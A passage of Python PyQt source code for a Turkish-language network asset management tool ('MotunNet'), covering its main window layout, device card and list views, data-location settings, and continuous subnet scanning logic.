        self.dept_filter.currentIndexChanged.connect(self.apply_filters);filter_layout.addWidget(self.dept_filter,0,1)
        filter_layout.addWidget(QLabel("Tür:"),1,0);self.type_filter=QComboBox();self.type_filter.addItem("Tümü","")
        for atype in AssetType:cfg=ASSET_CONFIG[atype];self.type_filter.addItem(f"{cfg['icon']} {cfg['name']}",atype.value)
        self.type_filter.currentIndexChanged.connect(self.apply_filters);filter_layout.addWidget(self.type_filter,1,1)
        filter_layout.addWidget(QLabel("Durum:"),2,0);self.status_filter=QComboBox();self.status_filter.addItems(["Tümü","🟢 Online","🔴 Offline","✅ VNC","⚠️ Kritik"]);self.status_filter.currentIndexChanged.connect(self.apply_filters);filter_layout.addWidget(self.status_filter,2,1)
        filter_layout.addWidget(QLabel("Eşleşme:"),3,0);self.match_filter=QComboBox();self.match_filter.addItems(["Tümü","✅ Birimi Var","❌ Birimi Yok"]);self.match_filter.currentIndexChanged.connect(self.apply_filters);filter_layout.addWidget(self.match_filter,3,1)
        left_layout.addWidget(filter_group)
        
        # VNC Hızlı
        vnc_group=QGroupBox("🖥️ Hızlı VNC");vnc_group.setMaximumHeight(60);vnc_l=QHBoxLayout(vnc_group);vnc_l.setSpacing(4);self.quick_ip=QLineEdit();self.quick_ip.setPlaceholderText("IP...");vnc_l.addWidget(self.quick_ip);q_btn=QPushButton("Bağlan");q_btn.setFixedWidth(60);q_btn.clicked.connect(self.quick_vnc);vnc_l.addWidget(q_btn);left_layout.addWidget(vnc_group)
        
        # İstatistikler - Kompakt Grid
        stats_group=QGroupBox("📊 İstatistikler");stats_group.setMaximumHeight(70);stats_layout=QGridLayout(stats_group);stats_layout.setSpacing(2);self.stats_labels={}
        stats_data=[('total','📊'),('online','🟢'),('matched','👥'),('critical','⚠️'),('vnc','🖥️')]
        for i,(key,icon) in enumerate(stats_data):lbl=QLabel(f"{icon} 0");lbl.setStyleSheet("font-size:11px;");self.stats_labels[key]=lbl;stats_layout.addWidget(lbl,0,i)
        left_layout.addWidget(stats_group)
        
        left_layout.addStretch()
        main_splitter.addWidget(left)
        
        # SAĞ PANEL - Tabs
        right=QWidget();right_layout=QVBoxLayout(right);right_layout.setContentsMargins(0,0,0,0);right_layout.setSpacing(0)
        self.tabs=QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane{border:1px solid #0f3460;border-radius:8px;background:#16213e;}
            QTabBar::tab{background:#0f3460;color:white;padding:8px 16px;margin-right:2px;border-top-left-radius:8px;border-top-right-radius:8px;font-size:11px;}
            QTabBar::tab:selected{background:#16213e;color:#00ff88;}
            QTabBar::tab:hover{background:#1a5276;}
        """)
        
        # Cihazlar sekmesi
        devices_tab=QWidget();devices_layout=QVBoxLayout(devices_tab);devices_layout.setContentsMargins(4,4,4,4);devices_layout.setSpacing(4)
        
        # Üst araç çubuğu
        search_frame=QFrame()
        search_frame.setStyleSheet("QFrame{background:#16213e;border-radius:8px;padding:5px;}")
        search_frame.setMaximumHeight(50)
        search_layout=QHBoxLayout(search_frame)
        search_layout.setContentsMargins(10,5,10,5)
        search_layout.setSpacing(10)
        
        search_layout.addWidget(QLabel("🔍"))
        self.device_search=QLineEdit()
        self.device_search.setPlaceholderText("Cihaz ara... (IP, isim, hostname)")
        self.device_search.setStyleSheet("QLineEdit{background:#0a0a14;color:#00ff88;border:1px solid #00ff88;border-radius:6px;padding:8px;font-size:12px;}")
        self.device_search.textChanged.connect(self.filter_device_cards)
        search_layout.addWidget(self.device_search,1)
        
        # Görünüm seçici butonları
        view_btn_style_active = "QPushButton{background:#00ff88;color:#0a0a14;padding:6px 12px;border-radius:4px;font-weight:bold;}"
        view_btn_style_inactive = "QPushButton{background:#0f3460;color:white;padding:6px 12px;border-radius:4px;}"
        
        self.card_view_btn = QPushButton("🃏 Kart")
        self.card_view_btn.setStyleSheet(view_btn_style_active)
        self.card_view_btn.clicked.connect(lambda: self.switch_device_view(0))
        search_layout.addWidget(self.card_view_btn)
        
        self.list_view_btn = QPushButton("📋 Liste")
        self.list_view_btn.setStyleSheet(view_btn_style_inactive)
        self.list_view_btn.clicked.connect(lambda: self.switch_device_view(1))
        search_layout.addWidget(self.list_view_btn)
        
        search_layout.addWidget(QLabel("│"))
        
        # DNS Tara butonu
        self.dns_scan_btn = QPushButton("🌐 DNS Tara")
        self.dns_scan_btn.setStyleSheet("QPushButton{background:#3498db;color:white;padding:6px 12px;border-radius:4px;font-weight:bold;}QPushButton:hover{background:#2980b9;}")
        self.dns_scan_btn.clicked.connect(self.scan_dns_servers)
        self.dns_scan_btn.setToolTip("Online cihazların DNS ayarlarını tara")
        search_layout.addWidget(self.dns_scan_btn)
        
        # DNS Import butonu
        self.dns_import_btn = QPushButton("📥 Import")
        self.dns_import_btn.setStyleSheet("QPushButton{background:#27ae60;color:white;padding:6px 12px;border-radius:4px;}QPushButton:hover{background:#219a52;}")
        self.dns_import_btn.clicked.connect(self.import_dns_csv)
        self.dns_import_btn.setToolTip("GPO scripti ile toplanan DNS CSV'sini içe aktar")
        search_layout.addWidget(self.dns_import_btn)
        
        search_layout.addWidget(QLabel("│"))
        
        # Kart boyutu
        self.card_size_combo=QComboBox()
        self.card_size_combo.addItems(["Küçük","Normal","Büyük"])
        self.card_size_combo.setCurrentIndex(1)
        self.card_size_combo.setStyleSheet("QComboBox{background:#0f3460;color:white;padding:5px 10px;border-radius:4px;}")
        self.card_size_combo.currentIndexChanged.connect(self.change_card_size)
        search_layout.addWidget(QLabel("📐"))
        search_layout.addWidget(self.card_size_combo)
        
        # Sonuç sayısı
        self.device_count_label=QLabel("0 cihaz")
        self.device_count_label.setStyleSheet("color:#888;font-size:11px;")
        search_layout.addWidget(self.device_count_label)
        
        devices_layout.addWidget(search_frame)
        
        # Stacked Widget - Kart ve Liste görünümü
        self.device_view_stack = QStackedWidget()
        
        # === KART GÖRÜNÜMÜ (Sayfa 0) ===
        card_page = QWidget()
        card_page_layout = QVBoxLayout(card_page)
        card_page_layout.setContentsMargins(0,0,0,0)
        
        scroll=QScrollArea();scroll.setWidgetResizable(True);scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setStyleSheet("""
            QScrollArea{border:none;background:transparent;}
            QScrollBar:vertical{background:#0a0a14;width:10px;border-radius:5px;}
            QScrollBar::handle:vertical{background:#0f3460;border-radius:5px;min-height:30px;}
            QScrollBar::handle:vertical:hover{background:#00ff88;}
        """)
        self.cards_widget=QWidget();self.cards_widget.setStyleSheet("background:transparent;")
        self.cards_grid=QGridLayout(self.cards_widget);self.cards_grid.setSpacing(10);self.cards_grid.setContentsMargins(5,5,5,5);self.cards_grid.setAlignment(Qt.AlignmentFlag.AlignTop|Qt.AlignmentFlag.AlignLeft)
        self.card_width=180
        scroll.setWidget(self.cards_widget)
        card_page_layout.addWidget(scroll)
        self.device_view_stack.addWidget(card_page)
        
        # === LİSTE GÖRÜNÜMÜ (Sayfa 1) ===
        list_page = QWidget()
        list_page_layout = QVBoxLayout(list_page)
        list_page_layout.setContentsMargins(0,0,0,0)
        
        self.device_table = QTableWidget()
        self.device_table.setColumnCount(9)
        self.device_table.setHorizontalHeaderLabels(["Durum", "Hostname", "IP Adresi", "Vendor", "MAC Adresi", "DNS", "Açık Portlar", "Varlık Adı", "Birim"])
        self.device_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.device_table.horizontalHeader().resizeSection(0, 60)
        self.device_table.horizontalHeader().resizeSection(1, 160)
        self.device_table.horizontalHeader().resizeSection(2, 100)
        self.device_table.horizontalHeader().resizeSection(3, 130)
        self.device_table.horizontalHeader().resizeSection(4, 130)
        self.device_table.horizontalHeader().resizeSection(5, 120)
        self.device_table.horizontalHeader().resizeSection(6, 100)
        self.device_table.horizontalHeader().resizeSection(7, 130)
        self.device_table.horizontalHeader().resizeSection(8, 100)
        self.device_table.setSortingEnabled(True)
        self.device_table.setAlternatingRowColors(True)
        self.device_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.device_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.device_table.customContextMenuRequested.connect(self.show_device_table_context_menu)
        self.device_table.doubleClicked.connect(self.device_table_double_click)
        self.device_table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #0f3460;color:white;font-size:11px;gridline-color:#16213e;}
            QTableWidget::item{padding:4px;}
            QTableWidget::item:selected{background:#0f3460;}
            QHeaderView::section{background:#16213e;color:#00ff88;padding:8px;border:none;font-weight:bold;font-size:11px;}
            QTableWidget::item:alternate{background:#0d0d1a;}
        """)
        list_page_layout.addWidget(self.device_table)
        self.device_view_stack.addWidget(list_page)
        
        devices_layout.addWidget(self.device_view_stack)
        
        # Dashboard - Özet Ekran (İLK SEKME)
        self.dashboard_widget=DashboardWidget(org=self.org,parent=self);self.tabs.addTab(self.dashboard_widget,"📊 Dashboard")
        
        self.tabs.addTab(devices_tab,"📱 Cihazlar")
        
        # Varlık Yönetimi
        self.org_widget=OrganizationWidget(self.org);self.tabs.addTab(self.org_widget,"🏢 Varlıklar")
        
        # Canlı İzleme (YENİ)
        self.monitoring_widget=MonitoringWidget();self.tabs.addTab(self.monitoring_widget,"👁️ Canlı İzleme")
        
        # Port Tarayıcı (YENİ)
        self.port_scanner_widget=PortScannerWidget();self.tabs.addTab(self.port_scanner_widget,"🔓 Port Tarayıcı")
        
        # Zafiyet Tarama (YENİ)
        self.vuln_scanner_widget=VulnerabilityScannerWidget();self.tabs.addTab(self.vuln_scanner_widget,"🔍 Zafiyet Tarama")
        
        # Sistem Bilgisi / DXDiag (YENİ)
        self.sysinfo_widget=SystemInfoWidget(org=self.org);self.tabs.addTab(self.sysinfo_widget,"💻 Sistem Bilgisi")
        
        # Ağ Haritası (YENİ) - TAM EKRAN
        map_tab=QWidget();map_layout=QVBoxLayout(map_tab)
        map_layout.setContentsMargins(2,2,2,2);map_layout.setSpacing(2)
        self.network_map=NetworkMapWidget()
        self.network_map.setSizePolicy(QSizePolicy.Policy.Expanding,QSizePolicy.Policy.Expanding)
        self.network_map.device_clicked.connect(self.show_device_details)
        self.network_map.device_double_clicked.connect(self.show_device_details)
        map_layout.addWidget(self.network_map,1)  # Stretch factor 1
        map_btns=QHBoxLayout()
        relayout_btn=QPushButton("🔄 Yeniden Düzenle")
        relayout_btn.setToolTip("Cihazları otomatik yerleştir")
        relayout_btn.clicked.connect(lambda:(self.network_map.positions.clear(),self.network_map.auto_layout(),self.network_map.update()))
        map_btns.addWidget(relayout_btn)
        map_btns.addStretch()
        map_help=QLabel("💡 Sol tık: Seç | Sürükle: Taşı | Sağ tık: Menü | Çift tık: Detay")
        map_help.setStyleSheet("color:#666;font-size:9px;")
        map_btns.addWidget(map_help)
        map_btns.addStretch()
        map_layout.addLayout(map_btns)
        self.tabs.addTab(map_tab,"🗺️ Ağ Haritası")
        
        # Hız Testi
        self.speed_widget=SpeedTestWidget();self.tabs.addTab(self.speed_widget,"🚀 Hız Testi")
        
        # Tablo
        table_tab=QWidget();table_layout=QVBoxLayout(table_tab);table_layout.setContentsMargins(4,4,4,4)
        self.table=QTableWidget();self.table.setColumnCount(10);self.table.setHorizontalHeaderLabels(["IP","Varlık","Tür","Birim","Konum","Hostname","MAC","Ping","Durum","VNC"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive);self.table.horizontalHeader().setStretchLastSection(True)
        self.table.horizontalHeader().resizeSection(0,100);self.table.horizontalHeader().resizeSection(1,120);self.table.horizontalHeader().resizeSection(2,80)
        self.table.setAlternatingRowColors(True);self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.doubleClicked.connect(lambda i:self.show_device_details(next((d for d in self.devices if d.ip==self.table.item(i.row(),0).text()),None)))
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu);self.table.customContextMenuRequested.connect(self.show_table_context_menu);table_layout.addWidget(self.table)
        export_btns=QHBoxLayout();csv_btn=QPushButton("📄 CSV Export");csv_btn.clicked.connect(self.export_csv);export_btns.addWidget(csv_btn);export_btns.addStretch();table_layout.addLayout(export_btns);self.tabs.addTab(table_tab,"📊 Tablo")
        
        # Log
        log_tab=QWidget();log_layout=QVBoxLayout(log_tab);log_layout.setContentsMargins(4,4,4,4);self.log_text=QTextEdit();self.log_text.setReadOnly(True);self.log_text.setFont(QFont("Consolas",9));self.log_text.setStyleSheet("QTextEdit{background:#0a0a14;color:#00ff88;border:none;border-radius:6px;}");log_layout.addWidget(self.log_text);self.tabs.addTab(log_tab,"📝 Log")
        
        # Güvenlik
        self.security_widget=SecurityWidget(org=self.org);self.tabs.addTab(self.security_widget,"🛡️ Güvenlik")
        # Anten Tespit sekmesi
        self.antenna_widget=AntennaWidget();self.tabs.addTab(self.antenna_widget,"📡 Anten Tespit")

        # Watchdog / Değişiklik İzleme (YENİ)
        self.watchdog_widget = WatchdogWidget(org=self.org, settings=self.settings)
        self.tabs.addTab(self.watchdog_widget, "🔔 İzleme Geçmişi")

        right_layout.addWidget(self.tabs)
        main_splitter.addWidget(right)
        
        # Splitter oranları
        main_splitter.setSizes([350,850]);main_splitter.setStretchFactor(0,0);main_splitter.setStretchFactor(1,1)
        main.addWidget(main_splitter)
        
        # Toolbar - Kompakt
        toolbar=QToolBar();toolbar.setMovable(False);toolbar.setIconSize(QSize(20,20));self.addToolBar(toolbar)
        toolbar.setStyleSheet("QToolBar{background:#16213e;border:none;padding:4px;spacing:4px;}QToolBar QToolButton{background:transparent;border:none;padding:6px 10px;border-radius:4px;color:white;font-size:11px;}QToolBar QToolButton:hover{background:#0f3460;}")
        vnc_act=QAction("🔐 VNC Ayarları",self);vnc_act.triggered.connect(self.vnc_settings);toolbar.addAction(vnc_act);toolbar.addSeparator()
        toolbar.addAction(QAction("📥 Import",self,triggered=lambda:self.org_widget.import_excel()))
        toolbar.addAction(QAction("📤 Export",self,triggered=lambda:self.org_widget.export_excel()));toolbar.addSeparator()
        data_loc_act=QAction("📁 Veri Konumu",self);data_loc_act.triggered.connect(self.show_data_location_dialog);toolbar.addAction(data_loc_act)
        refresh_act=QAction("🔄 Yenile",self);refresh_act.triggered.connect(self.refresh_all_data);toolbar.addAction(refresh_act);toolbar.addSeparator()
        about_act=QAction("ℹ️ Hakkında",self);about_act.triggered.connect(lambda:QMessageBox.about(self,"Hakkında","<h2 style='color:#00ff88'>MotunNet v10.4</h2><p><b>Ultimate Edition</b></p><hr><p>✓ Dashboard & Özet Ekran<br>✓ Cihaz Tarama & Ağ Keşfi<br>✓ Varlık & Birim Yönetimi<br>✓ Uzaktan Sistem Bilgisi (WMI)<br>✓ Zafiyet Tarama<br>✓ Canlı İzleme & Paket Yakalama<br>✓ Port Tarayıcı<br>✓ Ağ Haritası<br>✓ Hız Testi<br>✓ VNC Uzak Masaüstü<br><br>✓ Ağ Klasörü Paylaşımı</p>"));toolbar.addAction(about_act)
        
        self.status_bar=QStatusBar();self.status_bar.setStyleSheet("QStatusBar{background:#0f3460;color:#00ff88;font-size:11px;}");self.setStatusBar(self.status_bar);self.status_bar.showMessage("🚀 Hazır")
    
    def refresh_all_data(self):
        """Tüm verileri yenile (ağ klasöründen)"""
        self.org.load()  # Veriyi yeniden yükle
        self.refresh_dept_filter()
        if hasattr(self, 'org_widget'):
            self.org_widget.refresh_tree()
        if hasattr(self, 'dashboard_widget'):
            self.dashboard_widget.refresh_stats()
        self.statusBar().showMessage("✅ Veriler yenilendi", 3000)
    
    def refresh_dept_filter(self):
        current=self.dept_filter.currentData();self.dept_filter.clear();self.dept_filter.addItem("Tümü","")
        for dept in self.org.get_departments():self.dept_filter.addItem(f"🏢 {dept.name}",dept.id)
        idx=self.dept_filter.findData(current);self.dept_filter.setCurrentIndex(idx if idx>=0 else 0)
    def vnc_settings(self):
        dialog=QDialog(self);dialog.setWindowTitle("VNC Ayarları");dialog.setMinimumWidth(400);layout=QFormLayout(dialog)
        path_input=QLineEdit(self.settings.get('vnc_path',''));path_input.setPlaceholderText("TigerVNC yolu...");layout.addRow("VNC Yolu:",path_input)
        browse_btn=QPushButton("Gözat");browse_btn.clicked.connect(lambda:path_input.setText(QFileDialog.getOpenFileName(dialog,"TigerVNC Seç","","Executable (*.exe);;All (*)")[0] or path_input.text()));layout.addRow(browse_btn)
        layout.addRow(QLabel("<a href='https://tigervnc.org'>TigerVNC İndir</a>"))
        btns=QDialogButtonBox(QDialogButtonBox.StandardButton.Save|QDialogButtonBox.StandardButton.Cancel);btns.accepted.connect(lambda:(self.settings.set('vnc_path',path_input.text()),setattr(self,'vnc_manager',VNCManager(self.settings)),dialog.accept()));btns.rejected.connect(dialog.reject);layout.addRow(btns);dialog.exec()
    def apply_theme(self):
        self.setStyleSheet("""
            QMainWindow,QWidget{background-color:#1a1a2e;color:#eee;font-family:'Segoe UI',Arial,sans-serif;}
            QGroupBox{border:1px solid #16213e;border-radius:8px;margin-top:8px;padding-top:12px;background-color:#16213e;font-weight:bold;font-size:11px;}
            QGroupBox::title{subcontrol-origin:margin;left:8px;padding:0 6px;color:#00ff88;}
            QPushButton{background-color:#0f3460;border:none;border-radius:6px;padding:8px;color:white;font-weight:bold;font-size:11px;}
            QPushButton:hover{background-color:#1a5276;}QPushButton:disabled{background-color:#333;color:#666;}
            QLineEdit,QSpinBox,QComboBox{background-color:#16213e;border:1px solid #0f3460;border-radius:5px;padding:6px;color:white;font-size:11px;}
            QLineEdit:focus,QSpinBox:focus,QComboBox:focus{border:1px solid #00ff88;}
            QComboBox::drop-down{border:none;width:20px;}QComboBox::down-arrow{image:none;border:none;}
            QTableWidget{background-color:#16213e;alternate-background-color:#1a1a2e;gridline-color:#0f3460;border:none;font-size:11px;}
            QHeaderView::section{background-color:#0f3460;color:#00ff88;padding:6px;border:none;font-weight:bold;font-size:10px;}
            QScrollArea{border:none;}QStatusBar{background-color:#0f3460;color:#00ff88;font-size:10px;}
            QCheckBox{color:white;font-size:11px;}QCheckBox::indicator{width:16px;height:16px;border-radius:4px;border:2px solid #0f3460;background:#16213e;}
            QCheckBox::indicator:checked{background:#00ff88;border-color:#00ff88;}
            QDialog{background-color:#1a1a2e;}QLabel{font-size:11px;}
            QListWidget{background-color:#16213e;border:1px solid #0f3460;border-radius:5px;color:white;}
            QScrollBar:vertical{border:none;background:#16213e;width:8px;border-radius:4px;}
            QScrollBar::handle:vertical{background:#0f3460;border-radius:4px;min-height:30px;}
            QScrollBar::handle:vertical:hover{background:#00ff88;}
            QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{height:0px;}
            QScrollBar:horizontal{border:none;background:#16213e;height:8px;border-radius:4px;}
            QScrollBar::handle:horizontal{background:#0f3460;border-radius:4px;min-width:30px;}
            QScrollBar::handle:horizontal:hover{background:#00ff88;}
            QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal{width:0px;}
            QSplitter::handle{background:#0f3460;}QSplitter::handle:hover{background:#00ff88;}
        """)
    
    def start_sync_timer(self):
        """Ağ klasörü senkronizasyonu için timer başlat"""
        self.sync_timer = QTimer(self)
        self.sync_timer.timeout.connect(self.check_data_sync)
        self.sync_timer.start(10000)  # 10 saniyede bir kontrol
    
    def check_data_sync(self):
        """Veri dosyası değişiklik kontrolü"""
        if self.org.check_for_updates():
            # Dosya değişmiş, UI'ı güncelle
            if hasattr(self, 'org_widget'):
                self.org_widget.refresh_tree()
            if hasattr(self, 'dashboard_widget'):
                self.dashboard_widget.refresh_stats()
            self.statusBar().showMessage("📥 Veri güncellendi (başka kullanıcı değiştirdi)", 3000)
    
    def show_data_location_dialog(self):
        """Veri konumu ayar dialogu"""
        dialog = QDialog(self)
        dialog.setWindowTitle("📁 Veri Konumu Ayarları")
        dialog.setFixedSize(550, 250)
        dialog.setStyleSheet("QDialog{background:#1a1a2e;}")
        
        layout = QVBoxLayout(dialog)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Açıklama
        info = QLabel("🔄 Birden fazla bilgisayarda aynı verileri kullanmak için\npaylaşımlı bir ağ klasörü seçin.")
        info.setStyleSheet("color:#00d4ff;font-size:12px;")
        layout.addWidget(info)
        
        # Mevcut konum
        current_frame = QFrame()
        current_frame.setStyleSheet("QFrame{background:#16213e;border-radius:8px;padding:10px;}")
        current_layout = QVBoxLayout(current_frame)
        
        current_label = QLabel("📍 Mevcut Veri Konumu:")
        current_label.setStyleSheet("color:#888;font-size:10px;")
        current_layout.addWidget(current_label)
        
        current_path = QLabel(str(self.org.file))
        current_path.setStyleSheet("color:#00ff88;font-size:11px;font-family:Consolas;")
        current_path.setWordWrap(True)
        current_layout.addWidget(current_path)
        
        layout.addWidget(current_frame)
        
        # Yeni konum seçimi
        path_layout = QHBoxLayout()
        
        self.data_path_input = QLineEdit()
        self.data_path_input.setPlaceholderText("Örn: \\\\SUNUCU\\Paylasim\\motunnet_data.json")
        self.data_path_input.setText(self.settings.get('data_path', ''))
        self.data_path_input.setStyleSheet("padding:10px;font-size:11px;")
        path_layout.addWidget(self.data_path_input)
        
        browse_btn = QPushButton("📂 Gözat")
        browse_btn.setStyleSheet("padding:10px 15px;")
        browse_btn.clicked.connect(self.browse_data_location)
        path_layout.addWidget(browse_btn)
        
        layout.addLayout(path_layout)
        
        # Butonlar
        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        
        reset_btn = QPushButton("🔄 Varsayılana Dön")
        reset_btn.setStyleSheet("background:#f39c12;padding:10px 20px;")
        reset_btn.clicked.connect(lambda: self.data_path_input.setText(""))
        btn_layout.addWidget(reset_btn)
        
        save_btn = QPushButton("💾 Kaydet ve Uygula")
        save_btn.setStyleSheet("background:#00ff88;color:#1a1a2e;padding:10px 20px;")
        save_btn.clicked.connect(lambda: self.save_data_location(dialog))
        btn_layout.addWidget(save_btn)
        
        layout.addLayout(btn_layout)
        
        dialog.exec()
    
    def browse_data_location(self):
        """Dosya seçici aç"""
        path, _ = QFileDialog.getSaveFileName(
            self, "Veri Dosyası Konumu", 
            self.data_path_input.text() or str(Path.home() / "motunnet_data.json"),
            "JSON Files (*.json)"
        )
        if path:
            self.data_path_input.setText(path)
    
    def save_data_location(self, dialog):
        """Veri konumunu kaydet ve uygula"""
        new_path = self.data_path_input.text().strip()
        
        # Ayarlara kaydet
        self.settings.set('data_path', new_path)
        
        # OrganizationManager'ı güncelle
        self.org.set_data_path(new_path)
        
        # UI'ı yenile
        if hasattr(self, 'org_widget'):
            self.org_widget.refresh_tree()
        if hasattr(self, 'dashboard_widget'):
            self.dashboard_widget.refresh_stats()
        
        dialog.accept()
        
        QMessageBox.information(self, "Başarılı", 
            f"✅ Veri konumu güncellendi!\n\n📁 {self.org.file}\n\n"
            "Diğer bilgisayarlarda da aynı yolu ayarlayın.")
    
    def toggle_scan(self):
        # Sürekli tarama geri sayımı sırasında tıklandıysa durdur
        if hasattr(self, 'continuous_timer') and self.continuous_timer.isActive():
            self.stop_scan()
            return
        
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.stop_scan()
        else:
            self.start_scan()
    def start_scan(self):
        self.devices=[];self.table.setRowCount(0);self.radar.clear_devices();self.clear_cards();self.log_text.clear()
        subnet=self.subnet_input.text();self.settings.set('subnet',subnet)
        total=self.end_spin.value()-self.start_spin.value()+1;self.progress.setMaximum(total);self.progress.setValue(0)
        self.scanner_thread=ScannerThread(subnet,self.start_spin.value(),self.end_spin.value(),50,self.offline_check.isChecked(),self.org)
        self.scanner_thread.progress.connect(lambda c,t:(self.progress.setValue(c),self.progress.setFormat(f"%p% ({c}/{t})")))
        self.scanner_thread.device_found.connect(self.on_device_found);self.scanner_thread.scan_complete.connect(self.on_scan_complete);self.scanner_thread.status_update.connect(self.status_bar.showMessage);self.scanner_thread.start()
        self.scan_btn.setText("⏳ Taranıyor...");self.scan_btn.setEnabled(False);self.stop_btn.setEnabled(True);self.radar.start_scanning();self.log(f"🚀 Tarama başladı: {subnet}.{self.start_spin.value()}-{self.end_spin.value()}")
    def stop_scan(self):
        # Sürekli tarama timer'ını durdur
        if hasattr(self, 'continuous_timer'):
            self.continuous_timer.stop()
        
        if self.scanner_thread:
            self.scanner_thread.stop()
            self.scanner_thread.wait()
        
        self.scan_btn.setText("🔍 Taramayı Başlat")
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.radar.stop_scanning()
        self.log("⏹ Tarama durduruldu")
    def on_device_found(self,device):
        self.devices.append(device);self.radar.add_device(device);self.add_table_row(device);self.add_card(device);self.update_stats()
        if device.status=="online":name=f" [{device.asset_name}]" if device.asset_name else "";vnc=" 🖥️" if device.vnc_available else "";critical=" ⚠️" if device.is_critical else "";self.log(f"🟢 {device.ip}{name}{vnc}{critical} ({device.detection_method})")
    def on_scan_complete(self,devices):
        online=sum(1 for d in devices if d.status=="online");vnc=sum(1 for d in devices if d.vnc_available);matched=sum(1 for d in devices if d.asset_name);critical=sum(1 for d in devices if d.is_critical and d.status=="online")
        self.log(f"✅ Tamamlandı! Online:{online} VNC:{vnc} Eşleşen:{matched} Kritik:{critical}")
        # Ağ haritasını güncelle
        self.network_map.set_devices(self.devices)
        
        # Sürekli tarama modu aktifse
        if self.continuous_check.isChecked():
            self.continuous_countdown = self.scan_interval.value()
            self.continuous_timer.start(1000)  # Her saniye
            self.scan_btn.setText(f"🔄 {self.continuous_countdown}s")
            self.scan_btn.setEnabled(True)  # Durdurmak için tıklanabilir
            self.stop_btn.setEnabled(True)
            self.radar.start_scanning()  # Radar dönmeye devam etsin
            self.log(f"🔄 Sürekli tarama modu - {self.continuous_countdown}s sonra tekrar taranacak")
        else:
            self.scan_btn.setText("🔍 Taramayı Başlat");self.scan_btn.setEnabled(True);self.stop_btn.setEnabled(False);self.radar.stop_scanning()
    
    def continuous_scan_tick(self):
        """Sürekli tarama geri sayımı"""
        self.continuous_countdown -= 1
        if self.continuous_countdown <= 0:
            self.continuous_timer.stop()
            self.start_continuous_scan()
        else:
            self.scan_btn.setText(f"🔄 {self.continuous_countdown}s")
    
    def start_continuous_scan(self):
        """Sürekli tarama - mevcut cihazları koru, sadece durumları güncelle"""
        if not self.continuous_check.isChecked():
            self.scan_btn.setText("🔍 Taramayı Başlat")
            self.scan_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.radar.stop_scanning()
            return
        
        # Mevcut cihaz IP'lerini sakla
        existing_ips = {d.ip: d for d in self.devices}
        
        subnet = self.subnet_input.text()
        total = self.end_spin.value() - self.start_spin.value() + 1
        self.progress.setMaximum(total)
        self.progress.setValue(0)
        
        self.scanner_thread = ScannerThread(subnet, self.start_spin.value(), self.end_spin.value(), 50, self.offline_check.isChecked(), self.org)
        self.scanner_thread.progress.connect(lambda c, t: (self.progress.setValue(c), self.progress.setFormat(f"%p% ({c}/{t})")))
        self.scanner_thread.device_found.connect(lambda d: self.on_continuous_device_found(d, existing_ips))
        self.scanner_thread.scan_complete.connect(lambda d: self.on_continuous_scan_complete(d, existing_ips))
        self.scanner_thread.status_update.connect(self.status_bar.showMessage)
        self.scanner_thread.start()
        
        self.scan_btn.setText("⏳ Taranıyor...")
        self.scan_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.log(f"🔄 Sürekli tarama #{len(self.devices)} cihaz kontrol ediliyor...")
    
    def on_continuous_device_found(self, device, existing_ips):
        """Sürekli taramada cihaz bulunduğunda"""
        if device.ip in existing_ips:
            # Mevcut cihazı güncelle
            old_device = existing_ips[device.ip]
            old_status = old_device.status
            
            # Durumu güncelle
            old_device.status = device.status
            old_device.response_time = device.response_time
            old_device.vnc_available = device.vnc_available
            old_device.vnc_port = device.vnc_port
            old_device.open_ports = device.open_ports
            old_device.vendor = device.vendor or old_device.vendor
            old_device.device_type = device.device_type or old_device.device_type
            
            # Radar'ı güncelle
            if device.ip in self.radar.positions:
                self.radar.positions[device.ip]['device'] = old_device
            
            # Durum değiştiyse logla
            if old_status != device.status:
                if device.status == "online":
                    self.log(f"🟢 {device.ip} tekrar online!")
                else:
                    self.log(f"🔴 {device.ip} offline oldu")
        else:
            # Yeni cihaz bulundu
            self.devices.append(device)
            self.radar.add_device(device)
            self.add_table_row(device)
            self.add_card(device)
            self.update_stats()
            name = f" [{device.asset_name}]" if device.asset_name else ""
            self.log(f"🆕 YENİ: {device.ip}{name} bulundu!")
    
    def on_continuous_scan_complete(self, devices, existing_ips):
        """Sürekli tarama tamamlandığında"""
        # Tabloyu ve kartları güncelle
        self.refresh_table()
        self.refresh_cards()
        self.update_stats()
        
        # Yeni cihaz sayısı
        new_count = len(self.devices) - len(existing_ips)
        online = sum(1 for d in self.devices if d.status == "online")
        
        if new_count > 0:
            self.log(f"✅ Tarama tamamlandı! {new_count} yeni cihaz, {online} online")
        else:
            self.log(f"✅ Tarama tamamlandı! {online} online")
        
        # Sürekli tarama devam etsin
        if self.continuous_check.isChecked():
            self.continuous_countdown = self.scan_interval.value()
            self.continuous_timer.start(1000)
            self.scan_btn.setText(f"🔄 {self.continuous_countdown}s")
            self.scan_btn.setEnabled(True)
            self.stop_btn.setEnabled(True)
        else:
            self.scan_btn.setText("🔍 Taramayı Başlat")
            self.scan_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.radar.stop_scanning()
    
    def refresh_table(self):
        """Tabloyu yenile"""
        self.table.setRowCount(0)
        for d in self.devices:
            self.add_table_row(d)
    
    def refresh_cards(self):
        """Kartları yenile"""
        self.clear_cards()
        for device in self.devices:
            card = DeviceCardWidget(device)
            card.setFixedWidth(getattr(self, 'card_width', 180))
            card.clicked.connect(self.show_device_details)
            card.vnc_connect.connect(self.connect_vnc)
            card.assign_asset.connect(self.quick_assign_asset)
            card.edit_asset.connect(self.edit_device_asset)
